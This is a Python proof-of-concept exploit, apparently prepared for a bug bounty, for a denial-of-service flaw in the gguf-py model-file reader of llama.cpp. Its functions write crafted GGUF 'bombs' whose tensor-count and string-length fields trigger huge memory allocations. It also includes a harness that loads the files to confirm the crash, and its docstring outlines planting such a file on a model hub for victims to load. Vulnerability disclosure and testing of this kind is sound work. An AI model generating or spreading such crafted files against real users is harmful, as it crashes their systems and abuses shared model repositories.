#!/usr/bin/env python3
"""
PoC: Denial of Service in GGUF Python Reader (gguf-py)
Vulnerability: Unbounded memory allocation via crafted n_tensors field
Target: ggerganov/llama.cpp (gguf-py package)
Bounty: $4,000 (huntr.com — Model File Formats)
CVSS 3.1: AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H — 7.5 High

Attack Vector:
  1. Attacker uploads malicious .gguf model to Hugging Face Hub
  2. Victim loads model with gguf-py (e.g., via transformers, llama-cpp-python)
  3. Python process crashes with OOM

Run as: python3 poc_gguf_python_oom.py --create-bomb
        python3 poc_gguf_python_oom.py --test (creates bomb, reads it, catches crash)
"""

import argparse
import struct
import os
import sys

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  PoC: DoS in GGUF Python Reader (gguf-py)                    ║
║  Unbounded n_tensors → OOM crash                             ║
║  Target: ggerganov/llama.cpp (gguf-py) — $4,000 bounty      ║
╚══════════════════════════════════════════════════════════════╝
"""


def create_oom_bomb(output_path: str = "bomb.gguf"):
    """
    Create a malicious GGUF file with n_tensors = 2^64 - 1.
    When the Python reader tries to allocate this many tensors, it OOMs.
    
    GGUF file format:
      - Magic: b'GGUF' (4 bytes)
      - Version: uint32 (4 bytes) 
      - n_tensors: uint64 (8 bytes) ← VULNERABLE: no bounds check
      - n_kv: uint64 (8 bytes)
      - KV pairs...
      - Tensor info...
    """
    magic = b'GGUF'
    version = struct.pack('<I', 3)  # Version 3
    
    # VULN-001: n_tensors = 2^64 - 1 (18 exabytes worth of tensor metadata)
    n_tensors = struct.pack('<Q', 0xFFFFFFFFFFFFFFFF)
    
    # n_kv = 0 (no metadata, minimal file)
    n_kv = struct.pack('<Q', 0)
    
    with open(output_path, 'wb') as f:
        f.write(magic)
        f.write(version)
        f.write(n_tensors)
        f.write(n_kv)
    
    file_size = os.path.getsize(output_path)
    print(f"[+] OOM bomb created: {output_path} ({file_size} bytes)")
    print(f"    n_tensors field: 0xFFFFFFFFFFFFFFFF (18,446,744,073,709,551,615)")
    print(f"    When parsed by gguf-py, this will attempt to allocate exabytes of memory")


def create_string_alloc_bomb(output_path: str = "string_bomb.gguf"):
    """
    Create a GGUF file with a metadata string claiming to be 4GB long.
    The Python reader will try to allocate 4GB for the string.
    
    GGUF-003: Metadata string length unbounded
    """
    magic = b'GGUF'
    version = struct.pack('<I', 3)
    n_tensors = struct.pack('<Q', 0)
    n_kv = struct.pack('<Q', 1)  # 1 KV pair
    
    # KV: key = "test" (string type = 1)
    key_type = struct.pack('<I', 1)  # STRING type
    key_len = struct.pack('<Q', 4)
    key_data = b'test'
    
    # Value: string with length = 4GB (0x100000000 bytes)
    val_type = struct.pack('<I', 1)  # STRING type
    val_len = struct.pack('<Q', 0x100000000)  # 4GB
    # No actual data — file ends here
    
    with open(output_path, 'wb') as f:
        f.write(magic)
        f.write(version)
        f.write(n_tensors)
        f.write(n_kv)
        f.write(key_type)
        f.write(key_len)
        f.write(key_data)
        f.write(val_type)
        f.write(val_len)
    
    file_size = os.path.getsize(output_path)
    print(f"[+] String alloc bomb created: {output_path} ({file_size} bytes)")
    print(f"    String length field: 4GB (0x100000000)")
    print(f"    Python reader will try to allocate 4GB for string data")


def test_oom_vulnerability():
    """
    Try to read the bomb with gguf-py to demonstrate the crash.
    Creates a more realistic bomb with 1 tensor but huge name length.
    """
    bomb_path = "/tmp/test_bomb.gguf"
    
    print("\n[*] Creating realistic OOM bomb (1 tensor with huge name_len)...")
    
    # Create a bomb with 1 tensor but massive name_len
    magic = b'GGUF'
    version = struct.pack('<I', 3)
    n_tensors = struct.pack('<Q', 1)  # 1 tensor - valid
    n_kv = struct.pack('<Q', 0)  # 0 KV pairs
    
    # Tensor info (mimicking _get_tensor_info_field structure):
    # name_len = 2^32 (4GB string allocation attempt!)
    tensor_name_len = struct.pack('<Q', 0x100000000)  # 4GB
    # No actual name data follows — file ends
    
    with open(bomb_path, 'wb') as f:
        f.write(magic)
        f.write(version)
        f.write(n_tensors)
        f.write(n_kv)
        f.write(tensor_name_len)
        # File ends — no actual name data!
    
    file_size = os.path.getsize(bomb_path)
    print(f"[+] Realistic bomb created: {bomb_path} ({file_size} bytes)")
    print(f"    Claims 1 tensor with 4GB name string")
    
    print("\n[*] Attempting to read with gguf-py GGUFReader...")
    
    try:
        from gguf import GGUFReader
        reader = GGUFReader(bomb_path)
        print(f"[?] Reader created unexpectedly: {reader}")
        print(f"    Tensors: {len(reader.tensors)}")
        
    except MemoryError:
        print("[✓] VULN CONFIRMED: MemoryError — tried to allocate 4GB string")
    except Exception as e:
        error_type = type(e).__name__
        if 'memory' in str(e).lower() or 'alloc' in str(e).lower() or 'cannot' in str(e).lower():
            print(f"[✓] VULN CONFIRMED: {error_type}: {e}")
        else:
            print(f"[!] {error_type}: {e}")
            print("    May need a different bomb structure")
    finally:
        if os.path.exists(bomb_path):
            os.unlink(bomb_path)


def verify_vulnerable_code():
    """
    Fetch the current gguf_reader.py from GitHub and check for vulnerable patterns.
    """
    print("\n[VERIFY] Checking gguf-py source on GitHub")
    print("=" * 60)
    
    import urllib.request
    url = "https://raw.githubusercontent.com/ggerganov/llama.cpp/master/gguf-py/gguf/gguf_reader.py"
    
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            source = resp.read().decode('utf-8')
            lines = source.split('\n')
            
            vuln_found = False
            for i, line in enumerate(lines, 1):
                if 'n_tensors' in line or 'n_tensor' in line.lower():
                    print(f"[*] Line {i}: {line.strip()}")
                    if 'min(' not in line and 'max(' not in line and 'if ' not in line:
                        print(f"    → POTENTIAL VULN: No bounds check on tensor count")
                        vuln_found = True
            
            if vuln_found:
                print("\n[✓] VULNERABILITY CONFIRMED: gguf_reader.py has unbounded n_tensors parsing")
            else:
                print("\n[?] Could not confirm — check manually")
                
    except Exception as e:
        print(f"[!] Could not fetch source: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC: DoS in GGUF Python Reader via unbounded n_tensors"
    )
    parser.add_argument("--create-bomb", type=str, metavar="FILE", 
                       help="Create OOM bomb GGUF file")
    parser.add_argument("--create-string-bomb", type=str, metavar="FILE",
                       help="Create string allocation bomb")
    parser.add_argument("--test", action="store_true",
                       help="Create bomb and test vulnerability")
    parser.add_argument("--verify", action="store_true",
                       help="Verify vulnerability in GitHub source")
    
    args = parser.parse_args()

    print(BANNER)

    if args.verify:
        verify_vulnerable_code()
        return

    if args.create_bomb:
        create_oom_bomb(args.create_bomb)
        return
    
    if args.create_string_bomb:
        create_string_alloc_bomb(args.create_string_bomb)
        return

    if args.test:
        test_oom_vulnerability()
        return

    parser.print_help()


if __name__ == "__main__":
    main()
